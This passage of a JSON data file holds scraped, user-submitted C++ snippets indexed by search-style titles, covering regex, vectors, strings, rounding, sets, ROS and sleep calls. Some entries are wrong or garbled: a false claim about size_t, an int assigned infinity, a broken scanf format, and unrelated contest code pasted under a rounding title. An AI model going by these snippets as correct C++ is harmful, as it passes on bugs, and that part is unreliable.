    "description": "#include <iostream> #include <string> #include <regex>  bool is_email_valid(const std::string& email) {    // define a regular expression    const std::regex pattern       (\"(\\\\w+)(\\\\.|_)?(\\\\w*)@(\\\\w+)(\\\\.(\\\\w+))+\");     // try to match the string with the regular expression    return std::regex_match(email, pattern); }  int main() {     std::string email1 = \"text.example@randomcom\";      std::cout << email1 << \" : \" << (is_email_valid(email1) ?       \"valid\" : \"invalid\") << std::endl; }\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1155,
    "keyword": null,
    "link": null,
    "title": " c++ regex to validate indian phone number pattern",
    "description": "std::regex r(\"\\\\(\\\\d{3}\\\\) \\\\d{3}-\\\\d{4}\"); // e.g. \"(012) 345-6789\"  auto isValidPhoneNumber = std::regex_match(phone_num_str, r);\nCopy Code^([+][9][1]|[9][1]|[0]){0,1}([7-9]{1})([0-9]{9})$\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1156,
    "keyword": null,
    "link": null,
    "title": " c++ remove class from vector",
    "description": "#include <algorithm> #include <vector> #include <iostream>  class MyClass {     public:     std::string Name; };  std::vector<MyClass> MyClass_Vector;  int main() {     MyClass myclass_1;     MyClass myclass_2;     MyClass myclass_3;     MyClass myclass_4;     MyClass myclass_5;      myclass_1.Name = \"Name_1\";     myclass_2.Name = \"Name_2\";     myclass_3.Name = \"Name_3\";     myclass_4.Name = \"Name_4\";     myclass_5.Name = \"Name_5\";      MyClass_Vector.push_back(myclass_1);     MyClass_Vector.push_back(myclass_2);     MyClass_Vector.push_back(myclass_3);     MyClass_Vector.push_back(myclass_4);     MyClass_Vector.push_back(myclass_5);      std::cout << \"Before \" << MyClass_Vector.size() << \"\\n\";     for(int i = 0; i < MyClass_Vector.size(); i++) std::cout << MyClass_Vector[i].Name << \"\\n\";      std::string Name_Of_Class_To_Delete = \"Name_2\";      MyClass_Vector.erase(std::remove_if(MyClass_Vector.begin(), MyClass_Vector.end(), [&Name_Of_Class_To_Delete](const MyClass& myclass)->bool     {         return myclass.Name == Name_Of_Class_To_Delete;     }), MyClass_Vector.end());      std::cout << \"\\nAfter \" << MyClass_Vector.size() << \"\\n\";     for(int i = 0; i < MyClass_Vector.size(); i++) std::cout << MyClass_Vector[i].Name << \"\\n\";      return 0; }\ncarVec.erase(std::remove_if(carVec.begin(), carVec.end(), [&id_to_delete](const Car& ele)->bool             {                 return ele.getnewId() == id_to_delete;             }), carVec.end()); \n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1157,
    "keyword": null,
    "link": null,
    "title": " c++ remove element from vector",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1158,
    "keyword": null,
    "link": null,
    "title": " c++ remove item from list",
    "description": "// remove from list #include <iostream> #include <list>  int main () {   int myints[]= {17,89,7,14};   std::list<int> mylist (myints,myints+4);    mylist.remove(89);    std::cout << \"mylist contains:\";   for (std::list<int>::iterator it=mylist.begin(); it!=mylist.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1159,
    "keyword": null,
    "link": null,
    "title": " c++ remove last element from vector",
    "description": "vector.pop_back();\n#include <bits/stdc++.h>  using namespace std; int main(){     vector<int> v1{10, 20, 30, 40, 50};          //removing elemenets     v1.pop_back();  //removes 50     v1.pop_back();  //removes 40  }\nRemoves the last element of the vector\nvectorname.pop_back();\nNot Possible because C++ array has fixed size\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1160,
    "keyword": null,
    "link": null,
    "title": " c++ remove multiple items from list",
    "description": "class Anything{ public:\tint func() };  list<Anything> lst = <some_elements>;  //removes every element in list that returned true in line 9 lst.erase(std::remove_if(lst.begin(), lst.end(),                        [&](const Anything lst)-> bool                        { return lst.func() == something; }), //any condition         lst.end());\n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1161,
    "keyword": null,
    "link": null,
    "title": " c++ remove n characters from string",
    "description": "str.erase(0,10); \n",
    "reg_date": "2021-10-12T11:38:32.000Z"
  },
  {
    "id": 1162,
    "keyword": null,
    "link": null,
    "title": " c++ remove space from string",
    "description": "#include <algorithm>  int main() {     std::string str = \"H e l l o\";     str.erase(remove(str.begin(), str.end(), ' '), str.end());     std::cout << str; // Output Hello          return 0; }\nstatic std::string removeSpaces(std::string str) { \tstr.erase(remove(str.begin(), str.end(), ' '), str.end()); \treturn str; }\n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1163,
    "keyword": null,
    "link": null,
    "title": " c++ remove text file",
    "description": "#include <stdio.h>  int main () {   if( remove( \"myfile.txt\" ) != 0 )     perror( \"Error deleting file\" );   else     puts( \"File successfully deleted\" );   return 0; }\n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1164,
    "keyword": null,
    "link": null,
    "title": " c++ remove trailing whitespace",
    "description": "#include <algorithm>  int main() {     std::string str = \"H e l l o\";     str.erase(remove(str.begin(), str.end(), ' '), str.end());     std::cout << str; // Output Hello          return 0; }\n#include <algorithm>  #include <cctype> #include <locale>  // trim from start (in place) static inline void ltrim(std::string &s) {     s.erase(s.begin(), std::find_if(s.begin(), s.end(), [](unsigned char ch) {         return !std::isspace(ch);     })); }  // trim from end (in place) static inline void rtrim(std::string &s) {     s.erase(std::find_if(s.rbegin(), s.rend(), [](unsigned char ch) {         return !std::isspace(ch);     }).base(), s.end()); }  // trim from both ends (in place) static inline void trim(std::string &s) {     ltrim(s);     rtrim(s); }  // trim from start (copying) static inline std::string ltrim_copy(std::string s) {     ltrim(s);     return s; }  // trim from end (copying) static inline std::string rtrim_copy(std::string s) {     rtrim(s);     return s; }  // trim from both ends (copying) static inline std::string trim_copy(std::string s) {     trim(s);     return s; } \nremove trailing whitespace\n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1165,
    "keyword": null,
    "link": null,
    "title": " c++ remove whitespace from string",
    "description": "#include <algorithm>  int main() {     std::string str = \"H e l l o\";     str.erase(remove(str.begin(), str.end(), ' '), str.end());     std::cout << str; // Output Hello          return 0; }\nstatic std::string removeSpaces(std::string str) { \tstr.erase(remove(str.begin(), str.end(), ' '), str.end()); \treturn str; }\nstring removeSpaces(string str) {     stringstream s(str);     string temp;     str = \"\";     while (getline(s, temp, ' ')) {         str = str + temp;     }     return str; } //Input: Ha Noi Viet Nam //Output: HaNoiVietNam\n#include <algorithm>  #include <cctype> #include <locale>  // trim from start (in place) static inline void ltrim(std::string &s) {     s.erase(s.begin(), std::find_if(s.begin(), s.end(), [](unsigned char ch) {         return !std::isspace(ch);     })); }  // trim from end (in place) static inline void rtrim(std::string &s) {     s.erase(std::find_if(s.rbegin(), s.rend(), [](unsigned char ch) {         return !std::isspace(ch);     }).base(), s.end()); }  // trim from both ends (in place) static inline void trim(std::string &s) {     ltrim(s);     rtrim(s); }  // trim from start (copying) static inline std::string ltrim_copy(std::string s) {     ltrim(s);     return s; }  // trim from end (copying) static inline std::string rtrim_copy(std::string s) {     rtrim(s);     return s; }  // trim from both ends (copying) static inline std::string trim_copy(std::string s) {     trim(s);     return s; } \nremove trailing whitespace\n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1166,
    "keyword": null,
    "link": null,
    "title": " c++ render window",
    "description": "int main() {     // Create the main rendering window     sf::RenderWindow App(sf::VideoMode(800, 600, 32), \"SFML Graphics\");          // Start game loop     while (App.IsOpened())     {         // Process events         sf::Event Event;         while (App.GetEvent(Event))         {             // Close window : exit             if (Event.Type == sf::Event::Closed)                 App.Close();         }          // Clear the screen (fill it with black color)         App.Clear();          // Display window contents on screen         App.Display();     }      return EXIT_SUCCESS; } \n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1167,
    "keyword": null,
    "link": null,
    "title": " c++ replace character in string",
    "description": "#include <algorithm> #include <string>  void some_func() {   std::string s = \"example string\";   std::replace( s.begin(), s.end(), 'x', 'y'); // replace all 'x' to 'y' } \n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1168,
    "keyword": null,
    "link": null,
    "title": " c++ replace substrings",
    "description": "using namespace std;  string ReplaceAllSubstringOccurrences(string sAll, string sStringToRemove, string sStringToInsert) {    int iLength = sStringToRemove.length();    size_t index = 0;    while (true)    {       /* Locate the substring to replace. */       index = sAll.find(sStringToRemove, index);       if (index == std::string::npos)          break;        /* Make the replacement. */       sAll.replace(index, iLength, sStringToInsert);        /* Advance index forward so the next iteration doesn't pick it up as well. */       index += iLength;    }    return sAll; }   // EXAMPLE: in usage string sInitialString = \"Replace this, and also this, don't forget this too\"; string sFinalString = ReplaceAllSubstringOccurrences(sInitialString, \"this\", \"{new word/phrase}\"); cout << \"[sInitialString->\" << sInitialString << \"]\\n\"; cout << \"[sFinalString->\" << sFinalString << \"]\\n\";  /* OUTPUT: [sInitialString->Replace this, and also this, don't forget this too] [sFinalString->Replace {new word/phrase}, and also {new word/phrase}, don't forget {new word/phrase} too]  */ \n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1169,
    "keyword": null,
    "link": null,
    "title": " c++ require keyword",
    "description": "#include <string> #include <cstddef> #include <concepts>   // Declaration of the concept \"Hashable\", which is satisfied by any type 'T' // such that for values 'a' of type 'T', the expression std::hash<T>{}(a) // compiles and its result is convertible to std::size_t template<typename T> concept Hashable = requires(T a) {     { std::hash<T>{}(a) } -> std::convertible_to<std::size_t>; };   struct meow {};   // Constrained C++20 function template: template<Hashable T> void f(T) {} // // Alternative ways to apply the same constraint: // template<typename T> //    requires Hashable<T> // void f(T) {} // // template<typename T> // void f(T) requires Hashable<T> {}   int main() {   using std::operator\"\"s;   f(\"abc\"s); // OK, std::string satisfies Hashable //f(meow{}); // Error: meow does not satisfy Hashable }\n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1170,
    "keyword": null,
    "link": null,
    "title": " c++ reset stream",
    "description": " // headers #include <sstream>  // syntax <stringstream-name>.clear(); <stringstream-name>.str();  // example ostringstream oTestStrm; oTestStrm << \"Hello World!\"; oTestStrm.clear(); oTestStrm.str(\"\"); \n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1171,
    "keyword": null,
    "link": null,
    "title": " c++ restrict template types",
    "description": "#include <type_traits>  template<typename T> class observable_list {     static_assert(std::is_base_of<list, T>::value, \"T must inherit from list\");     // code here.. }; \n",
    "reg_date": "2021-10-12T11:38:33.000Z"
  },
  {
    "id": 1172,
    "keyword": null,
    "link": null,
    "title": " c++ return multiple values",
    "description": "#include <tuple>  std::tuple<int, int> divide(int dividend, int divisor) {     return  std::make_tuple(dividend / divisor, dividend % divisor); }  #include <iostream>  int main() {     using namespace std;      int quotient, remainder;      tie(quotient, remainder) = divide(14, 3);      cout << quotient << ',' << remainder << endl; }\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1173,
    "keyword": null,
    "link": null,
    "title": " c++ return value of set insert",
    "description": "set<int> st; auto p = st.insert(2); // p.first - iterator to the inserted element // p.second - true if 2 don't exists in the set otherwise false\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1174,
    "keyword": null,
    "link": null,
    "title": " c++ reverse part of vector",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n//Reverse vector partially (from index x to index y) reverse(v.begin()+x, v.begin()+y+1);\n// Given the vector vector<int> a = { 1, 45, 54, 71, 76, 12 };  // Reverse the vector reverse(a.begin(), a.end());\nreverse(start_index, last_index);\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1175,
    "keyword": null,
    "link": null,
    "title": " c++ reverse vector",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1176,
    "keyword": null,
    "link": null,
    "title": " c++ rgb code",
    "description": "TColor Colr; Panel1->Color = clRed; Panel2->Color = TColor(0x006CFF6C); Panel3->Color = RGB(250, 250, 180); Colr = TColor(RGB(255, 255, 0)); Panel4->Color = Colr;\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1177,
    "keyword": null,
    "link": null,
    "title": " c++ ros publisher",
    "description": "#include \"ros/ros.h\" #include \"std_msgs/String.h\"  /**  * This tutorial demonstrates simple receipt of messages over the ROS system.  */ void chatterCallback(const std_msgs::String::ConstPtr& msg) {   ROS_INFO(\"I heard: [%s]\", msg->data.c_str()); }  int main(int argc, char **argv) {   ros::init(argc, argv, \"listener\");    ros::NodeHandle n;    ros::Subscriber sub = n.subscribe(\"chatter\", 1000, chatterCallback);    ros::spin();    return 0; }\n#include \"ros/ros.h\" #include \"std_msgs/String.h\"  #include <sstream>  /**  * This tutorial demonstrates simple sending of messages over the ROS system.  */ int main(int argc, char **argv) {   ros::init(argc, argv, \"talker\");    ros::NodeHandle n;    ros::Publisher chatter_pub = n.advertise<std_msgs::String>(\"chatter\", 1000);    ros::Rate loop_rate(10);    int count = 0;   while (ros::ok())   {     std_msgs::String msg;      std::stringstream ss;     ss << \"hello world \" << count;     msg.data = ss.str();      ROS_INFO(\"%s\", msg.data.c_str());      chatter_pub.publish(msg);      ros::spinOnce();      loop_rate.sleep();     ++count;   }    return 0; } \n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1178,
    "keyword": null,
    "link": null,
    "title": " c++ ros subscriber",
    "description": "#include \"ros/ros.h\" #include \"std_msgs/String.h\"  /**  * This tutorial demonstrates simple receipt of messages over the ROS system.  */ void chatterCallback(const std_msgs::String::ConstPtr& msg) {   ROS_INFO(\"I heard: [%s]\", msg->data.c_str()); }  int main(int argc, char **argv) {   ros::init(argc, argv, \"listener\");    ros::NodeHandle n;    ros::Subscriber sub = n.subscribe(\"chatter\", 1000, chatterCallback);    ros::spin();    return 0; }\n#include \"ros/ros.h\" #include \"std_msgs/String.h\"  #include <sstream>  /**  * This tutorial demonstrates simple sending of messages over the ROS system.  */ int main(int argc, char **argv) {   ros::init(argc, argv, \"talker\");    ros::NodeHandle n;    ros::Publisher chatter_pub = n.advertise<std_msgs::String>(\"chatter\", 1000);    ros::Rate loop_rate(10);    int count = 0;   while (ros::ok())   {     std_msgs::String msg;      std::stringstream ss;     ss << \"hello world \" << count;     msg.data = ss.str();      ROS_INFO(\"%s\", msg.data.c_str());      chatter_pub.publish(msg);      ros::spinOnce();      loop_rate.sleep();     ++count;   }    return 0; } \n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1179,
    "keyword": null,
    "link": null,
    "title": " c++ round function",
    "description": "#include <iostream> #include <cmath>  using namespace std;  int main() {     int x = 15;     double result;     result = round(x);     cout << \"round(\" << x << \") = \" << result << endl;      return 0; } \n#include<bits/stdc++.h>  int main() { \tusing namespace std; \tios_base::sync_with_stdio(false), cin.tie(nullptr);  \tint T; cin >> T; \tfor (int case_num = 1; case_num <= T; case_num ++) {  \t\tint64_t L, R; cin >> L >> R; R++; \t\tbool parity = 0; \t\tint64_t coeff = 1; \t\tint64_t ans = 0; \t\twhile (L < R) { \t\t\tassert(1 <= L && L < R); \t\t\tauto is_good = [&](int64_t v) { \t\t\t\tassert(v > 0); \t\t\t\tbool d = v % 2; \t\t\t\twhile (v > 0) { \t\t\t\t\tif (v % 2 != d) return false; \t\t\t\t\td = !d; \t\t\t\t\tv /= 10; \t\t\t\t} \t\t\t\treturn d == 0; \t\t\t}; \t\t\twhile (L < R && L % 10 != 0) { \t\t\t\tif (is_good(L)) { \t\t\t\t\tans += coeff; \t\t\t\t} \t\t\t\tL++; \t\t\t} \t\t\twhile (L < R && R % 10 != 0) { \t\t\t\t--R; \t\t\t\tif (is_good(R)) { \t\t\t\t\tans += coeff; \t\t\t\t} \t\t\t}  \t\t\tif (L == R) break; \t\t\tassert(L % 10 == 0 && R % 10 == 0); \t\t\tassert(L >= 10);  \t\t\tL /= 10; sorry for the error \ndouble round(double x); float round(float x); long double round(long double x); double round(T x); // For integral type \n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1180,
    "keyword": null,
    "link": null,
    "title": " c++ round number down",
    "description": "#include <iostream> #include <cmath>  using namespace std;  int main() { \tdouble num1 = 4.8;   \tdouble num2 = 4.3;   \tcout << floor(num1) << endl; // --> 4   \tcout << floor(num2) << endl; // --> 4 }\n#include <iostream> #include <cmath>  using namespace std;  int main() { \tdouble num1 = 4.8;   \tdouble num2 = 4.3;   \tcout << ceil(num1) << endl; // --> 5   \tcout << ceil(num2) << endl; // --> 5 }\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1181,
    "keyword": null,
    "link": null,
    "title": " c++ round number to whole",
    "description": "#include <iostream> #include <cmath>  using namespace std;  int main() { \tdouble num1 = 4.8;   \tdouble num2 = 4.3;   \tcout << ceil(num1) << endl; // --> 5   \tcout << ceil(num2) << endl; // --> 5 }\n#include <iostream> #include <cmath>  using namespace std;  int main() { \tdouble num1 = 4.8;   \tdouble num2 = 4.3;   \tcout << round(num1) << endl; // --> 5   \tcout << round(num2) << endl; // --> 4 }\n",
    "reg_date": "2021-10-12T11:38:34.000Z"
  },
  {
    "id": 1182,
    "keyword": null,
    "link": null,
    "title": " c++ round number up",
    "description": "#include <iostream> #include <cmath>  using namespace std;  int main() { \tdouble num1 = 4.8;   \tdouble num2 = 4.3;   \tcout << ceil(num1) << endl; // --> 5   \tcout << ceil(num2) << endl; // --> 5 }\n#include <iostream> #include <cmath>  using namespace std;  int main() {     int x = 15;     double result;     result = round(x);     cout << \"round(\" << x << \") = \" << result << endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1183,
    "keyword": null,
    "link": null,
    "title": " c++ round to int",
    "description": "#include <iostream> #include <cmath>  using namespace std;  int main() {     int x = 15;     double result;     result = round(x);     cout << \"round(\" << x << \") = \" << result << endl;      return 0; } \n cout << \"Nearest value of x :\" << round(x) << \"\\n\"; \ndouble round(double x); float round(float x); long double round(long double x); double round(T x); // For integral type \n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1184,
    "keyword": null,
    "link": null,
    "title": " c++ scanf",
    "description": "#include <stdio.h>  int main() {     int a, b, c;     printf(\"Enter the first value:\");     scanf(\"%d\", &a);     printf(\"Enter the second value:\");     scanf(\"%d\", &b);     c = a + b;     printf(\"%d + %d = %d\\n\", a, b, c);     return 0; } \n/* scanf example */ #include <stdio.h>  int main () {   char str [80];   int i;    printf (\"Enter your family name: \");   scanf (\"ys\",str);     printf (\"Enter your age: \");   scanf (\"%d\",&i);   printf (\"Mr. %s , %d years old.\\n\",str,i);   printf (\"Enter a hexadecimal number: \");   scanf (\"%x\",&i);   printf (\"You have entered %#x (%d).\\n\",i,i);      return 0; }\n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1185,
    "keyword": null,
    "link": null,
    "title": " c++ scanf always expects double and not float",
    "description": "float max, zz, rate, time, percent;  printf(\"Please enter the size (in GB): \"); scanf_s(\"%f\", &max);  printf(\"\\nPlease enter how much you have downloaded already (in GB): \"); scanf_s(\"%f\", &zz);  printf(\"\\nPlease enter the downloadrate (in kB/s): \"); scanf_s(\"%f\", &rate);\n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1186,
    "keyword": null,
    "link": null,
    "title": " c++ server service ros",
    "description": "#include \"ros/ros.h\" #include \"beginner_tutorials/AddTwoInts.h\"  bool add(beginner_tutorials::AddTwoInts::Request  &req,          beginner_tutorials::AddTwoInts::Response &res) {   res.sum = req.a + req.b;   ROS_INFO(\"request: x=%ld, y=%ld\", (long int)req.a, (long int)req.b);   ROS_INFO(\"sending back response: [%ld]\", (long int)res.sum);   return true; }  int main(int argc, char **argv) {   ros::init(argc, argv, \"add_two_ints_server\");   ros::NodeHandle n;    ros::ServiceServer service = n.advertiseService(\"add_two_ints\", add);   ROS_INFO(\"Ready to add two ints.\");   ros::spin();    return 0; } \n#include \"ros/ros.h\" #include \"beginner_tutorials/AddTwoInts.h\" #include <cstdlib>  int main(int argc, char **argv) {   ros::init(argc, argv, \"add_two_ints_client\");   if (argc != 3)   {     ROS_INFO(\"usage: add_two_ints_client X Y\");     return 1;   }    ros::NodeHandle n;   ros::ServiceClient client = n.serviceClient<beginner_tutorials::AddTwoInts>(\"add_two_ints\");   beginner_tutorials::AddTwoInts srv;   srv.request.a = atoll(argv[1]);   srv.request.b = atoll(argv[2]);   if (client.call(srv))   {     ROS_INFO(\"Sum: %ld\", (long int)srv.response.sum);   }   else   {     ROS_ERROR(\"Failed to call service add_two_ints\");     return 1;   }    return 0; } \n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1187,
    "keyword": null,
    "link": null,
    "title": " c++ set add element",
    "description": "// set::insert (C++98) #include <iostream> #include <set>  int main () {   std::set<int> myset;   std::set<int>::iterator it;   std::pair<std::set<int>::iterator,bool> ret;    // set some initial values:   for (int i=1; i<=5; ++i) myset.insert(i*10);    // set: 10 20 30 40 50    ret = myset.insert(20);               // no new element inserted    if (ret.second==false) it=ret.first;  // \"it\" now points to element 20    myset.insert (it,25);                 // max efficiency inserting   myset.insert (it,24);                 // max efficiency inserting   myset.insert (it,26);                 // no max efficiency inserting    int myints[]= {5,10,15};              // 10 already in set, not inserted   myset.insert (myints,myints+3);    std::cout << \"myset contains:\";   for (it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1188,
    "keyword": null,
    "link": null,
    "title": " c++ set comparator",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <vector> #include <algorithm> #include <set>  using namespace std; //set mentains internally the ascending order of these numbers void setDemo() { \tset<int> S; \tS.insert(1); \tS.insert(2); \tS.insert(-1); \tS.insert(-10); \tS.erase(1);//to remove an element \t \t//Print all the values of the set in ascending order \tfor(int x:S){ \t\tcout<<x<<\" \"; \t} \t \t//check whether an element is present in a set or not \tauto it = S.find(-1);//this will return an iterator to -1 \t//if not present it will return an iterator to S.end() \t \tif (it == S.end()){ \t\tcout<<\"not Present\\n\"; \t}else{ \t\tcout <<\" present\\n\"; \t\tcout << *it <<endl; \t} \t//iterator to the first element in the set which is \t//greater than or equal to -1 \tauto it2 = S.lower_bound(-1); \t//for strictly greater than -1 \tauto it3 = S.upper_bound(-1); \t//print the contents of both the iterators \tcout<<*it2<<\" \"<<*it3<<endl; } \t int main() { \tsetDemo(); \treturn 0; }\nset<int, less<int>> st; // or set<int, greater<int>> st; // c++ 11 auto cmp = [](int a, int b) { return ... }; set<int, decltype(cmp)> s(cmp);\n",
    "reg_date": "2021-10-12T11:38:35.000Z"
  },
  {
    "id": 1189,
    "keyword": null,
    "link": null,
    "title": " c++ set console title",
    "description": "#include <Windows.h>  int main() { \tSetConsoleTitleA(\"title name\"); }\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1190,
    "keyword": null,
    "link": null,
    "title": " c++ set count",
    "description": "Input: set <int> myset = {1, 2, 3, 4, 6};    myset.count(2); Output: 1 Input: set<int> myset = {1, 2, 3, 4, 6};    myset.count(5); Output: 0\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1191,
    "keyword": null,
    "link": null,
    "title": " c++ set element at index",
    "description": "std::set<int> my_set; //inserting element in set my_set.insert(5); my_set.insert(15); my_set.insert(10); my_set.insert(7);  //accessing nth element form set int x = *std::next(my_set.begin(), n);\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1192,
    "keyword": null,
    "link": null,
    "title": " c++ set sort order",
    "description": "struct cmpStruct {   bool operator() (int const & lhs, int const & rhs) const   {     return lhs > rhs;   } };  std::set<int, cmpStruct > myInverseSortedSet; \n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1193,
    "keyword": null,
    "link": null,
    "title": " c++ set value to inf",
    "description": "#include <limits>  int a = std::numeric_limits<int>::infinity(); float a = std::numeric_limits<float>::infinity(); double a = std::numeric_limits<double>::infinity(); ...\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1194,
    "keyword": null,
    "link": null,
    "title": " c++ shared pointer",
    "description": "#include <memory> std::shared_ptr<int> foo = std::make_shared<int> (10);\n#include <iostream> #include <memory>   void report(std::shared_ptr<int> ptr) {     if (ptr) {         std::cout << \"*ptr=\" << *ptr << \"\\n\";     } else {         std::cout << \"ptr is not a valid pointer.\\n\";     } }   int main() {     std::shared_ptr<int> ptr;     report(ptr);       ptr = std::make_shared<int>(7);     report(ptr); } //output: //ptr is not a valid pointer. //*ptr=7\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1195,
    "keyword": null,
    "link": null,
    "title": " c++ shared pointer operator bool",
    "description": "#include <iostream> #include <memory>   void report(std::shared_ptr<int> ptr) {     if (ptr) {         std::cout << \"*ptr=\" << *ptr << \"\\n\";     } else {         std::cout << \"ptr is not a valid pointer.\\n\";     } }   int main() {     std::shared_ptr<int> ptr;     report(ptr);       ptr = std::make_shared<int>(7);     report(ptr); } //output: //ptr is not a valid pointer. //*ptr=7\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1196,
    "keyword": null,
    "link": null,
    "title": " c++ shift array to the right",
    "description": "\t// Shift array elements to right \tconst int SIZE = 9; \tint arr[SIZE]={1,2,3,4,5,6,7,8,9};  \tint last = arr[SIZE - 1];\t\t \tfor (int i = SIZE - 1; i > 0; i--)\t \t\tarr[i] = arr[i - 1];\t\t \t \tarr[0] = last;\n\tint temp=arr[0]; \t/********************************\tMethod 1 \tfor (int i = 0; i < SIZE - 1; i++)\t\t \t{ \t\tarr[i] = arr[i + 1]; \t} \tarr[SIZE-1]=temp; \t*/ \t//\t\t\t\t\t\t\t\t\tMethod 2 \tfor (int i = 1; i < SIZE - 1; i++) \t{ \t\tarr[i - 1] = arr[i]; \t} \tarr[SIZE - 1] = temp; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1197,
    "keyword": null,
    "link": null,
    "title": " c++ short if",
    "description": "(condition) ? (if_true) : (if_false)\n(condition) ? (if_true) : (if_false) \n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1198,
    "keyword": null,
    "link": null,
    "title": " c++ show time elapsed",
    "description": "//***C++11 Style:*** #include <chrono>  std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now(); std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();  std::cout << \"Time difference = \" << std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count() << \"[&micro;s]\" << std::endl; std::cout << \"Time difference = \" << std::chrono::duration_cast<std::chrono::nanoseconds> (end - begin).count() << \"[ns]\" << std::endl;\n",
    "reg_date": "2021-10-12T11:38:36.000Z"
  },
  {
    "id": 1199,
    "keyword": null,
    "link": null,
    "title": " c++ sin",
    "description": "/* sin example */ #include <stdio.h>      /* printf */ #include <math.h>       /* sin */  #define PI 3.14159265  int main () {   double param, result;   param = 30.0;   result = sin (param*PI/180);   printf (\"The sine of %f degrees is %f.\\n\", param, result );   return 0; }\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1200,
    "keyword": null,
    "link": null,
    "title": " c++ size t",
    "description": "// size_t is a type definition for unsigned long long // This means that writing size_t is the excact same as // writing unsigned long long\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1201,
    "keyword": null,
    "link": null,
    "title": " c++ skip whitespace",
    "description": "// skipws flag example #include <iostream>     // std::cout, std::skipws, std::noskipws #include <sstream>      // std::istringstream  int main () {   char a, b, c;    std::istringstream iss (\"  123\");   iss >> std::skipws >> a >> b >> c;   std::cout << a << b << c << '\\n';    iss.seekg(0);   iss >> std::noskipws >> a >> b >> c;   std::cout << a << b << c << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1202,
    "keyword": null,
    "link": null,
    "title": " c++ sleep function",
    "description": "#include <chrono> #include <thread>  std::this_thread::sleep_for(std::chrono::milliseconds(x));\n#include <unistd.h>  sleep(10);\n#include <Windows.h>  Sleep(number of milliseconds);\n// to use sleep function on windows with c++ #include <Windows.h> Sleep(3000) // based on milliseconds\n#include <time.h>  int main(int argc, char const *argv[]) {     sleep(10);\t// wait for 10s      return 0; }\n#include <unistd.h> unsigned int sleep(unsigned int seconds);\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1203,
    "keyword": null,
    "link": null,
    "title": " c++ smart pointer 2d array",
